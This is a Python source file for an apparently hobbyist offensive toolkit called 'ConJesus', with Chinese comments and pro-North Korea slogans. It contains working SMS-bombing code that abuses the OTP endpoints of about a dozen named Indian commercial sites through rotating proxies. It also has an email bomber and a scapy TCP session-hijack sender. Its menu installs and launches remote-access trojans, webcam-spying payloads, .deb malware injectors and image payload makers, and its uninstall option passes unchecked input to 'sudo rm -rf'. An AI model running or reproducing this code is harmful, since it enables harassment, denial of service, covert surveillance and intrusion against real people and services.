# 进口货
import os, urllib, sys, requests, json, smtplib, threading, time
from os import urandom
from random import seed, random
from getpass import getpass
from scapy.all import *
from datetime import datetime
from urllib.request import urlopen
from threading import Thread
from time import sleep
from base64 import b64decode
from colorama import Fore, Back, Style

# 仅在Linux上运行
if os.name != "posix":
    
    exit()

# 需要连接，所以如果您没有连接，则退出 
print(Fore.YELLOW,"First Time run is always slow please wait...",Style.RESET_ALL)
print("Trying to connect...")
def is_internet():
    try:
        urlopen('https://www.google.com', timeout=1)
        return True
    except urllib.error.URLError as Error:
        print(Error)
        return False

if is_internet():
    print(Fore.GREEN + "Connected | All in online! " + Style.RESET_ALL)
else:
    print(Fore.RED + "EXIT - No connection..." + Style.RESET_ALL)
    exit()

# 脚本工具
def TCPhijacking():
    print("-"*50)
    print("-"*10,"TCP Session Hijacking Attack","-"*10)
    print("-"*50)
    
    src_ip = input('Source IP Address: ')
    dst_ip = input('Destination IP Address: ')
    src_port = int(input('Source Port: '))
    dst_port = int(input('Destination Port: '))
    seq_num = int(input('Sequence Number (raw): '))
    ack_num = int(input('Acknowledgment number (raw): '))
    data = input('Message: ')
    
    print("Sending Session Hijacking Packet.......")
    
    IPLayer = IP(src=src_ip,dst=dst_ip)
    TCPLayer = TCP(sport=src_port, dport=dst_port, flags=0x018,seq=seq_num, ack=ack_num)
    pkt = IPLayer/TCPLayer/str(data)
    send(pkt,verbose=0)

def SMSbomb():
    class Bomber:
    	
    	
    
    	def __init__(self,user_mobile,number_of_messege):
    		self.user_mobile = user_mobile
    		self.number_of_messege = number_of_messege
    		self.acceptlanguage = "en-GB,en-US;q=0.9,en;q=0.8"
    
    
    	def getUserAgent(self):
    		with open('useragent.json') as f:
    			data = json.load(f)
    			user_agent_list =  data["user_agent"]
    		userAgent = random.choice(user_agent_list)
    		return userAgent
    
    
    	def _checkinternet(self):
    		try:
    			requests.get("https://www.google.com")
    			return True
    		except:
    			print("Check your internet connection and the modules")
    			return False
    
    	def getproxy(self):
    		proxy_scrape_url = "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all"
    		try:
    			proxy_request = requests.get(proxy_scrape_url, Timeout =  10)
    		except:
    			return False
    		proxylist =  proxy_request.text.split()
    		return 'https://' + random.choice(proxylist)
    	
    	def flipkart(self):
    		url = "https://rome.api.flipkart.com/api/7/user/otp/generate"
    		flipkart_header = {
    		"Accept": "*/*",
    		"Accept-Encoding": "gzip, deflate, br",
    		"Accept-Language": self.acceptlanguage,
    		"Connection": "keep-alive",
    		"Content-Length": "53",
    		"Content-Type": "application/json",
    		"DNT": "1",	
    		"Host": "rome.api.flipkart.com",
    		"Origin": "https://www.flipkart.com",
    		"Referer": "https://www.flipkart.com/",
    		"Sec-Fetch-Dest": "empty",
    		"Sec-Fetch-Mode": "cors",
    		"Sec-Fetch-Site": "same-site",
    		"User-Agent": self.getUserAgent(),
    		"X-user-agent": self.getUserAgent() + " FKUA/website/42/website/Desktop"
    		}
    		try:
    			request =  requests.post(url, data  = json.dumps( {"loginId":"+91" + self.user_mobile}) , headers = flipkart_header,proxies={ 'https' : self.getproxy()})
    		except:
    			return False
    		if(request.status_code ==  200 ):
    			return True
    
    
    
    	def confirmtkt(self):
    		url = "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=" + self.user_mobile + "&newOtp=true"
    		confirmtkt_header = {
    		"Accept": "*/*",
    		"Accept-Encoding": "gzip, deflate, br",
    		"Accept-Language": self.acceptlanguage,
    		"Connection": "keep-alive",
    		"DNT": "1",
    		"Host": "securedapi.confirmtkt.com",
    		"Origin": "https://www.confirmtkt.com",
    		"Referer": "https://www.confirmtkt.com/rbooking-d/trips",
    		"Sec-Fetch-Dest": "empty",
    		"Sec-Fetch-Mode": "cors",
    		"Sec-Fetch-Site": "same-site",
    		"User-Agent": self.getUserAgent()
    		}
    		try:
    			request = requests.get(url ,headers=confirmtkt_header,proxies={ 'https' : self.getproxy()})
    		except:
    			return False
    		if(request.status_code==200):
    			return True
    
    
    	def lenskart(self):
    		url = "https://api.lenskart.com/v2/customers/sendOtp"
    		lenskat_header = {
    			"accept": "application/json, text/plain, */*",
    			"accept-encoding": "gzip, deflate, br",
    			"accept-language": self.acceptlanguage,
    			"content-length": "26",
    			"content-type": "application/json;charset=UTF-8",
    			"dnt": "1",
    			"origin": "https://www.lenskart.com",
    			"referer": "https://www.lenskart.com/",
    			"sec-fetch-dest": "empty",
    			"sec-fetch-mode": "cors",
    			"sec-fetch-site": "same-site",
    			"user-agent": self.getUserAgent(),
    			"x-api-client": "desktop",
    			"x-b3-traceid": "991589389250988",
    			"x-session-token": "85d09926-3a73-4dbe-9f30-86b9f29f4a67"
    			}
    		try:
    			request = requests.post(url, data=json.dumps({"telephone":self.user_mobile}),headers = lenskat_header,proxies={ 'https' : self.getproxy()})
    		except:
    			return False
    		if(request.status_code==200):
    			return True
    
    	def justdial(self):
    		url = "https://www.justdial.com/functions/whatsappverification.php"
    		justdial_header = {
    			"accept": "*/*",
    			"accept-encoding": "gzip, deflate, br",
    			"accept-language": self.acceptlanguage,
    			"content-length": "38",
    			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    			"origin": "https://www.justdial.com",
    			"referer": "https://www.justdial.com/",
    			"sec-fetch-dest": "empty",
    			"sec-fetch-mode": "cors",
    			"sec-fetch-site": "same-origin",
    			"user-agent": self.getUserAgent(),
    			"x-requested-with": "XMLHttpRequest",
    		}
    		try:
    			r = requests.post(url, data="mob="+ self.user_mobile +"&vcode=&rsend=0&name=deV", headers=justdial_header,proxies={ 'https' : self.getproxy()})
    		except:
    			return False
    		if(r.status_code==200):
    			return True
    
    	def indialends(self):
    		url = "https://indialends.com/internal/a/otp.ashx"
    		indialends_header = {
    			"accept": "*/*",
    			"accept-encoding": "gzip, deflate, br",
    			"accept-language": self.acceptlanguage,
    			"Connection": "keep-alive",
    			"content-length": "26",
    			"content-type": "application/x-www-form-urlencoded",
    			"dnt": "1",
    			"Host": "indialends.com",
    			"origin": "https://www.indialends.com",
    			"referer": "https://www.indialends.com/",
    			"sec-fetch-dest": "empty",
    			"sec-fetch-mode": "cors",
    			"sec-fetch-site": "same-origin",
    			"user-agent": self.getUserAgent(),
    			"x-requested-with": "XMLHttpRequest",
    		}
    		try:
    			r = requests.post(url, data="log_mode=1&ctrl="+self.user_mobile, headers=indialends_header,proxies={ 'https' : self.getproxy()})
    		except:
    			return False
    		if(r.status_code==200):
    			return True
    
    	def apolopharmacy(self):
    		url = "https://www.apollopharmacy.in/sociallogin/mobile/sendotp"
    		apolopharmacy_header = {
    			"accept": "*/*",
    			"accept-encoding": "gzip, deflate, br",
    			"accept-language": self.acceptlanguage,
    			"Connection": "keep-alive",
    			"content-length": "17",
    			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    			"dnt": "1",
    			"origin": "https://www.apollopharmacy.in",
    			"referer": "https://www.apollopharmacy.in/",
    			"sec-fetch-dest": "empty",
    			"sec-fetch-mode": "cors",
    			"sec-fetch-site": "same-origin",
    			"user-agent": self.getUserAgent(),
    			"x-requested-with": "XMLHttpRequest",
    		}
    		try:
    			request = requests.post(url, data="mobile=" + self.user_mobile, headers=apolopharmacy_header,proxies={ 'https' : self.getproxy()})
    		except:
    			return False
    		if (request.status_code == 200):
    			return True
    
    	def magicbrick(self):
    		url = "https://accounts.magicbricks.com/userauth/api/validate-mobile"
    		magicbrike_header = {
    			"accept": "application/json, text/javascript, */*; q=0.01",
    			"accept-encoding": "gzip, deflate, br",
    			"accept-language": self.acceptlanguage,
    			"content-length": "20",
    			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    			"dnt": "1",
    			"origin": "https://accounts.magicbricks.com",
    			"referer": "https://accounts.magicbricks.com/userauth/login",
    			"sec-fetch-dest": "empty",
    			"sec-fetch-mode": "cors",
    			"sec-fetch-site": "same-origin",
    			"user-agent": self.getUserAgent(),
    			"x-requested-with": "XMLHttpRequest"
    		}
    		try:
    			request = requests.post(url, data="ubimobile="+ self.user_mobile, headers=magicbrike_header,proxies={ 'https' : self.getproxy()})
    		except:
    			return False
    		if(request.status_code==200):
    			return True
    
    	def ajio(self):
    		url = "https://login.web.ajio.com/api/auth/generateLoginOTP"
    		ajio_header = {
    			"accept": "application/json     ",
    			"accept-encoding": "gzip, deflate, br",
    			"accept-language": self.acceptlanguage,
    			"Connection": "keep-alive",
    			"content-length": "29",
    			"content-type": "application/json",
    			"Host": "login.web.ajio.com",
    			"dnt": "1",
    			"origin": "https://www.ajio.com",
    			"referer": "https://www.ajio.com/",
    			"sec-fetch-dest": "empty",
    			"sec-fetch-mode": "cors",
    			"sec-fetch-site": "same-site",
    			"user-agent": self.getUserAgent()
    		}
    		try:
    			request = requests.post(url, data=json.dumps({"mobileNumber": self.user_mobile}), headers=ajio_header,proxies={ 'https' : self.getproxy()})
    		except:
    			return False
    		if (request.json()['success']):
    			return True
    		return False
    
    
    	def mylescars(self):
    		url = "https://www.mylescars.com/usermanagements/chkContact"
    		myle_header = {
    			"accept": "application/json",
    			"accept-encoding": "gzip, deflate, br",
    			"accept-language": self.acceptlanguage,
    			"content-length": "20",
    			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    			"dnt": "1",
    			"origin": "https://www.mylescars.com",
    			"referer": "https://www.mylescars.com/",
    			"sec-fetch-dest": "empty",
    			"sec-fetch-mode": "cors",
    			"sec-fetch-site": "same-origin",
    			"user-agent": self.getUserAgent(),
    			"x-requested-with": "XMLHttpRequest"
    		}
    		try:
    			request = requests.post(url, data="contactNo="+ self.user_mobile, headers=myle_header,proxies={ 'https' : self.getproxy()})
    		except:
    			return False
    		if(request.status_code==200):
    			return True
    
    	def unacademy(self):
    		url = "https://unacademy.com/api/v1/user/get_app_link/"
    		unac_header = {
    			"accept": "application/json",
    			"accept-encoding": "gzip, deflate, br",
    			"accept-language": self.acceptlanguage,
    			"Connection": "keep-alive",
    			"content-length": "107",
    			"content-type": "application/json",
    			"dnt": "1",
    			"origin": "https://unacademy.com",
    			"referer": "https://unacademy.com",
    			"sec-fetch-dest": "empty",
    			"sec-fetch-mode": "cors",
    			"sec-fetch-site": "same-origin",
    			"user-agent": self.getUserAgent()
    		}
    		try:
    			request = requests.post(url, data=json.dumps({"phone": self.user_mobile}), headers=unac_header,proxies={ 'https' : self.getproxy()})
    		except:
    			return False
    		if(request.status_code==200):
    			return True
    
    	def snapdeal(self):
    		url = "https://www.snapdeal.com/sendOTP"
    		snapdeal_head = {
    			"accept": "*/*",
    			"accept-encoding": "gzip, deflate, br",
    			"accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
    			"content-length": "62",
    			"content-type": "application/x-www-form-urlencoded",
    			"DNT": "1",
    			"Host": "www.snapdeal.com",
    			"origin": "https://www.snapdeal.com",
    			"referer": "https://www.snapdeal.com/iframeLogin",
    			"sec-fetch-dest": "empty",
    			"sec-fetch-mode": "cors",
    			"sec-fetch-site": "same-origin",
    			"user-agent": self.getUserAgent(),
    			"X-Requested-With": "XMLHttpRequest"
    		}
    		try:
    			request = requests.post(url, data="emailId=&mobileNumber="+ self.user_mobile + "&purpose=LOGIN_WITH_MOBILE_OTP",headers=snapdeal_head,proxies={ 'https' : self.getproxy()})
    		except:
    			return False
    		if (request.json()['status'] == "fail"):
    			return False
    		return True
    
    	def jiomart(self):
    		url = "https://www.jiomart.com/mst/rest/v1/id/details/" + self.user_mobile
    		jiomart_header = {
    			"accept": "application/json, text/plain,*/*",
    			"accept-encoding": "gzip, deflate, br",
    			"accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
    			"dnt": "1",
    			"sec-fetch-dest": "empty",
    			"sec-fetch-mode": "cors",
    			"sec-fetch-site": "same-origin",
    			"user-agent": self.getUserAgent(),
    			"referer": "https://www.jiomart.com/customer/account/login"
    		}
    		try:
    			request = requests.get(url, headers = jiomart_header,proxies={ 'https' : self.getproxy()})
    		except:
    			return False
    		if(request.status_code==400):
    			return True
    											
    		
    
    	def startBombing(self):
    		if(self._checkinternet()):
    			counter = 0
    			while True:
    				if self.flipkart():
    					counter+=1
    					print("Sent !!!!!")
    				if self.confirmtkt():
    					counter+=1
    					print("Sent !!!!!")
    				if self.lenskart():
    					counter+=1
    					print("Sent !!!!!")
    				if self.justdial():
    					print("Sent !!!!!")
    					counter+=1
    				if self.indialends():
    					print("Sent !!!!!")
    					counter+=1
    				if self.apolopharmacy():
    					print("Sent !!!!!")
    					counter+=1
    				if self.magicbrick():
    					print("Sent !!!!!")
    					counter+=1
    				if self.apolopharmacy():
    					print("Sent !!!!!")
    					counter+=1
    				if self.magicbrick():
    					print("Sent !!!!!")
    					counter+=1
    				if self.mylescars():
    					counter+=1
    					print("Sent !!!!!")
    				if self.unacademy():
    					print("Sent !!!!!")
    					counter+=1
    				if self.snapdeal():
    					print("Sent !!!!!")
    					counter +=1
    				if self.jiomart():
    					print("Sent !!!!!")
    					counter +=1
    				if(counter >= self.number_of_messege):
    					break
    
    			#["flipkart","confirmtkt","lenskart","justdial","indialends","apolopharmacy","magicbrick","ajio","mylescars","unacademy","snapdeal", "jiomart"]:
    		else:
    			print("possible errors -  Internet connectivity")
    
    
    print('-'*50)
    print('-'*10,'SMS-Bomb','-'*10)
    print('-'*50)
    
    
    while True:
    	try:
    		usermobile = input("Enter the number (without country code) : ")
    		if(len(usermobile)==10 and usermobile.isdigit()): break
    	except:
    		print("Please check your input !!")
    number_of_messege = 100
    try:
    	number_of_messege = int(input("Enter the number of messege you want to send ( empty for default) : "))
    except:
    	pass
    if(number_of_messege>500):
    	number_of_messege=200
    bomber = Bomber(usermobile,number_of_messege)
    bomber.startBombing()

def EMAILbomb():
    print('-'*50)
    print('-'*10,'EMAIL-BOMB','-'*10)
    print('-'*50)
    user = input('Anonymous name: ')
    print ('')
    email = input('Host Email Address: ')
    print ('')
    passwd = getpass('Password: ')
    print ('')
    to = input('TARGET Email Address:')
    print('')
    total = input('Number of Emails: ')
    print('')
    body = input('Message: ')
    print('')
    Cserver = input('Custom smtp server (leave blank to use gmail): ')
    print ('')
    
    if not Cserver == '':
        stmp_server = Cserver
        Cport = input('Custom smtp port (leave blank to use default port): ')
        if not Cport == '':
            port = int(Cport)
        else:
            port = 587
    else:
        smtp_server = 'smtp.gmail.com'
        port = 587
    
    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()
        server.starttls()
        server.login(email, passwd)
        for i in range(1, int(total) + 1):
            subject = urandom(9)
            msg = 'From: ' + user + '\nMessage: ' + '\n' + body
            server.sendmail(email, to, msg)
            print ("\rE-mails sent: %i" % i)
            sleep(2) #防止电子邮件阻止和禁止
            sys.stdout.flush()
        server.quit()
        print ('\n Done')
        sys.quit()
    except KeyboardInterrupt:
        print ('[-] Canceled')
        sys.exit()
    except smtplib.SMTPAuthenticationError:
        print ('\n[!] The username, password or custom STMP server/port you entered is incorrect.')
        sys.exit()

def SnitchRAT():
    print(Fore.YELLOW, "Stitch is Cross Platform Python Remote Administrator Tool for python2[!]Refer Below Link For Wins & MAc Os(!)https://nathanlopez.github.io/Stitch ", Style.RESET_ALL)
    choice=input("[1]Install [2]Run -)==> ")
    if choice == "1":
        os.system("sudo git clone https://github.com/nathanlopez/Stitch.git")
        os.system("cd Stitch && sudo pip install -r lnx_requirements.txt")
    
    if choice == "2":
        os.system("cd Stitch && sudo python main.py")

def msf_venomSTART():
    print(Fore.YELLOW, "MSFvenom Payload Creator (MSFPC) is a wrapper to generate \nmultiple types of payloads, based on users choice.\nThe idea is to be as simple as possible (only requiring one input) \nto produce their payload. [!]https://github.com/g0tmi1k/msfpc ", Style.RESET_ALL)
    choice = input("[1]Install [2]Run  -)==> ")
    if choice == "1":
        os.system("sudo git clone https://github.com/g0tmi1k/msfpc.git")
        os.system("cd msfpc;sudo chmod +x msfpc.sh")
     
    if choice == "2":
        os.system("cd msfpc;sudo bash msfpc.sh -h -v")

def VENOM():
        print(Fore.YELLOW, "venom (malicious_server) was build to take advantage of \n apache2 webserver to deliver payloads (LAN) using a fake webpage writen in html", Style.RESET_ALL)
        choice=input("[1]Install [2]Run -)==> ")
        if choice == "1":
            os.system("sudo git clone https://github.com/r00t-3xp10it/venom.git")
            os.system("sudo chmod -R 775 venom*/ && cd venom*/ && cd aux && sudo bash setup.sh")
            os.system("sudo ./venom.sh -u")

        if choice == "2":
            os.system("cd venom && sudo ./venom.sh")

def SQLmap():
        print(Fore.YELLOW, "sqlmap is an open source penetration testing tool that automates the process of \ndetecting and exploiting SQL injection flaws and taking over of database server", Style.RESET_ALL)
        choice=input("[1]Install [2]Run -)==> ")
        if choice == "1":
            os.system("sudo git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev")
            print("Downloaded...")

def DCAM():
    print(Fore.YELLOW, "Powerful Tool For Grab Front Camera Snap Using A Link  \n[+]https://github.com/kinghacker0/WishFish ", Style.RESET_ALL)
    choice=input("[1]Install [2]Run  -)==> ")
    if choice == "1":
        os.system("sudo git clone https://github.com/kinghacker0/WishFish; sudo apt install php wget openssh")

    if choice == "2":
        os.system("cd wishfish && sudo bash wishfish.sh")

def EvilApp():
    print(Fore.YELLOW, "EvilApp is a script to generate Android App that can hijack authenticated sessions in cookies.\n [!]https://github.com/crypticterminal/EvilApp ", Style.RESET_ALL)
    choice=input("[1]Install [2]Run -)==> ")
    if choice == "1":
        os.system("sudo git clone https://github.com/crypticterminal/EvilApp")

    if choice == "2":
        os.system("cd evilapp && bash evilapp.sh")

def hatcloud():
    print(Fore.YELLOW, "HatCloud build in Ruby. It makes bypass in CloudFlare for discover real IP.\n\b [!]https://github.com/HatBashBR/HatCloud ", Style.RESET_ALL)
    choice=input("[1]Install [2]Run -)==> ")
    if choice == "1":
        os.system("git clone https://github.com/HatBashBR/HatCloud.git")

    if choice == "2":
        site=input("Enter Site -)==> ")
        os.system("cd HatCloud;sudo ruby hatcloud.rb -b {site}")

def socialscan():
    print(Fore.YELLOW, "Check email address and username availability on online platforms with 100% accuracy \n\t[*]https://github.com/iojw/socialscan ", Style.RESET_ALL)
    choice=input("[1]Install [2]Run -)==> ")
    if choice == "1":
        os.system("sudo pip install socialscan")

    if choice == "2":
        name=input("Enter Username or Emailid (if both then please space between email & username) -)==> ")
        os.system(f"sudo socialscan {name}")

def DebInject():
    print(Fore.YELLOW, "Debinject is a tool that inject malicious code into *.debs \n\t [!]https://github.com/UndeadSec/Debinject", Style.RESET_ALL)
    choice=input("[1]Install [2]Run -)==> ")
    if choice == "1":
        os.system("sudo git clone https://github.com/UndeadSec/Debinject.git ")

    if choice == "2":
        os.system("cd Debinject;python debinject.py")

def PixLoad():
    print(Fore.YELLOW, "Pixload -- Image Payload Creating tools \n Pixload is Set of tools for creating/injecting payload into images.\n\t [!]https://github.com/chinarulezzz/pixload", Style.RESET_ALL)
    choice=input("[1]Install [2]How To Use -)==> ")
    if choice == "1":
        print("Installing Packeges...")
        time.sleep(2)
        os.system("sudo apt install libgd-perl libimage-exiftool-perl libstring-crc32-perl")
        print("Downloading Repository ...")
        time.sleep(1)
        os.system("sudo git clone https://github.com/chinarulezzz/pixload.git ")
		
    if choice == "2":
        print("Trying to open Webbrowser ...")
        time.sleep(2)
        webbrowser.open_new_tab("https://github.com/chinarulezzz/pixload")

def Pyshell():
    print(Fore.YELLOW, "Pyshell is a Rat Tool that can be able to download & upload files,\n Execute OS Command and more.. \n\t [!]https://github.com/knassar702/pyshell", Style.RESET_ALL)
    choice=input("[1]Install [2]Run -)==> ")
    if choice == "1" :
        os.system("sudo git clone https://github.com/khalednassar702/Pyshell;sudo pip install pyscreenshot python-nmap requests")
    
    if choice == "2":
        os.system("cd Pyshell;./Pyshell")

def spycam():
    print(Fore.YELLOW,"Script to generate a Win32 payload that takes the webcam image every 1 minute and send it to the attacker",Style.RESET_ALL)
    choice=input("[1]Install [2]Run -)===> ")
    if choice == "1":
        os.system("sudo git clone https://github.com/thelinuxchoice/spycam ")
        os.system("cd spycam && bash install.sh && chmod +x spycam")

    if choice == "2":
        os.system("cd spycam && ./spycam")

def mobdroid():
    print(Fore.YELLOW,"Mob-Droid helps you to generate metasploit payloads in easy way\n without typing long commands and save your \n[!]https://github.com/kinghacker0/Mob-Droid", Style.RESET_ALL)
    choice=input("[1]Install [2]Run -)===> ")
    if choice == "1":
        os.system("git clone https://github.com/kinghacker0/mob-droid")

    if choice == "2":
        os.system("cd Mob-Droid;sudo python mob-droid.py")
        
def Uninstall():
	print(Fore.YELLOW,"Uninstall Current Folders / Tools in ConJesus | Specify File name",Style.RESET_ALL)
	remove=input("rm -rf | -)===> ")
	os.system(f"sudo rm -rf {remove} ")
# 所有绑定都将追溯到此。轻轻踩一下 => ALL BINDING WILL TRACEBACK TO THIS. TREAD LIGHTLY
print("Welcome Guest...")
print('''
                     <-. (`-')_          (`-')  _ (`-').->            (`-').-> 
 _             .->      \( OO) )         ( OO).-/ ( OO)_       .->    ( OO)_   
 \-,-----.(`-')----. ,--./ ,--/   <-.--.(,------.(_)--\_) ,--.(,--.  (_)--\_)  
  |  .--./( OO).-.  '|   \ |  | (`-'| ,| |  .---'/    _ / |  | |(`-')/    _ /  
 /_) (`-')( _) | |  ||  . '|  |)(OO |(_|(|  '--. \_..`--. |  | |(OO )\_..`--.  
 ||  |OO ) \|  |)|  ||  |\    |,--. |  | |  .--' .-._)   \|  | | |  \.-._)   \ 
(_'  '--'\  '  '-'  '|  | \   ||  '-'  / |  `---.\       /\  '-'(_ .'\       / 
   `-----'   `-----' `--'  `--' `-----'  `------' `-----'  `-----'    `-----'  
 朝鲜＃1我们永远关注您| CONJESUS ||*所有绑定都将追溯到此。轻轻踩一下* 
 +$$$$$$$$$$$$$$$$$$$$$$$$$$$$N+SIMPLE-WEB-ATK 简单网络+N$$$$$$$$$$$$$$$$$$$$$$$$$$$+
      <-=========================(- Bombing 轰炸袭击 -)========================->
                            /3/ SMS-BOMB /4/ EMAIL-BOMB 
  ______________________________________________________________________________
 +----------------------------X+EXPLOITATION 漏洞利用+X---------------------------+
 -)==>5 STITCH (RAT) -)==>6 MSF_VENOM -)==>7 VENOM (MAL) -)==>8 SQLmap -)==>9 DroidCam (MAL)
 -)==>10 EvilApp (MAL) -)==>11 Hatcloud -)==>12 Socialscan -)==>13 DebInject (MAL)
 -)==>14 Pixload (MAL) -)==>15 PyShell (RAT) -)==>16 TCP-Hijack (SES) -)==>17 Spycam (MAL)
 -)==>18 mobdroid (PAY)
 _______________________________________________________________________________
                      -)=====> 99 Tool-Uninstall 99 <=====(- ''')
choice=input('CON<?>Jesus-)=> ')
# 如果使用elif语句，则使用非常简单的选择
if choice =='3':
    SMSbomb()
elif choice =='4':
    EMAILbomb()
elif choice =='5':
	SnitchRAT()
elif choice =='6':
	msf_venomSTART()
elif choice =='7':
	VENOM()
elif choice =='8':
	SQLmap()
elif choice =='9':
	DCAM()
elif choice =='10':
	EvilApp()
elif choice =='11':
	hatcloud()
elif choice =='12':
	socialscan()
elif choice =='13':
	DebInject()
elif choice =='14':
	PixLoad()
elif choice =='15':
	Pyshell()
elif choice =='16':
    TCPhijacking()
elif choice =='17':
	spycam()
elif choice =='18':
	mobdroid()
# 使用RM卸载Loader
elif choice =='99':
	Uninstall()
else:
    print(Fore.RED + "Exited - Error" + Style.RESET_ALL)

#我们将永远走一条路。我们站在朝鲜。并将永远站立
# Translation > We will always walk the same way. We stand in North Korea. And will stand forever
